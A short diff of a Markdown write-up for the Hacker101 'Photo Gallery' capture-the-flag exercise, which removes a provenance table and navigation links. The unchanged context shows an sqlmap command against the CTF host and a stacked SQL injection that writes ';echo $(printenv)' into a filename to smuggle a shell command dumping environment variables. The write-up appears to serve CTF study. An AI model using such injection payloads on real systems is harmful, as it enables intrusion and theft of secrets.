@@ -15,11 +15,3 @@ sqlmap 'https://1c394af5effe9679d5c6d0805e59f099.ctf.hacker101.com/fetch?id=2' -
 ```bash
 /fetch?id=3; UPDATE photos SET filename=";echo $(printenv)" WHERE id=3; commit;
 ```
-
-## Procedencia
-
-| Repositorio | Archivo original | Commit de origen |
-| --- | --- | --- |
-| CBBH | BB/Hackerone/5 - Photo Gallery.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |
-
-[Índice de categoría](../README.md) · [Inicio](../../README.md)
